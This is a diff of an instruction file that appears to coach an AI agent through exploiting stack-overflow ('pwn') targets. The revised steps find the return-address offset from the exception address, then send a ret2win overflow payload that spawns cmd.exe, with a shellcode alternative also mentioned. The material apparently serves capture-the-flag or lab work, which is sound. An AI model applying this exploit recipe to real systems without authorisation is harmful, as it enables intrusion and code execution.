@@ -174,14 +174,18 @@ DRIVING A TARGET THAT READS STDIN (pwn workflow):
      Feed it and continue again; do not conclude it is unexploitable.
   4. Classic stack-overflow recipe on a no-ASLR/no-DEP binary — do it in ONE
      ```python block so it doesn't stall between steps:
-        send(cyclic(600))            # start SMALL (200-800): a huge payload
-        shutdown_stdin()             #   overruns the whole stack and faults in
-        print(dbg("c"))              #   the copy before it can return
-        r = regs(); print(r)         # inspect EIP and the fault address
-        print("off_eip", cyclic_find(r.get("Eip") or r.get("Rip")))
-     Then: payload = b"A"*offset + p32(win_addr); send(payload); shutdown_stdin();
-     print(dbg("c")); and VERIFY success empirically (a cmd.exe/child spawned, a
-     flag printed, or recv() output) — do not assume.
+        send(cyclic(400)); shutdown_stdin(); print(dbg("c"))   # crash the copy
+        st = state(); print(st)      # exception_addr = the TRUE faulting EIP
+        fault = st.get("exception_addr")
+        print("offset", cyclic_find(fault))
+     CRITICAL: for the offset use state()["exception_addr"] (the exception
+     record's faulting address) — NOT regs()["Eip"]. On this build the target is
+     emulated x86 (WoW64) and the Eip REGISTER is unreliable at a fault, but the
+     exception address is correct. If a `continue` after the crash hangs, don't
+     re-continue in a loop — you already have exception_addr; move on to the
+     payload. Then: payload = b"A"*offset + p32(win_addr); rerun with `run -i`,
+     send(payload); shutdown_stdin(); print(dbg("c")); and VERIFY success
+     empirically (a cmd.exe/child spawned, a flag printed, recv() output).
   5. Find the target: inspect `iat`, strings, and xrefs to interesting strings
      (system / WinExec / "cmd.exe"). A hidden function that spawns a shell is your
      ret2win target. With DEP off you can alternatively jump to shellcode placed
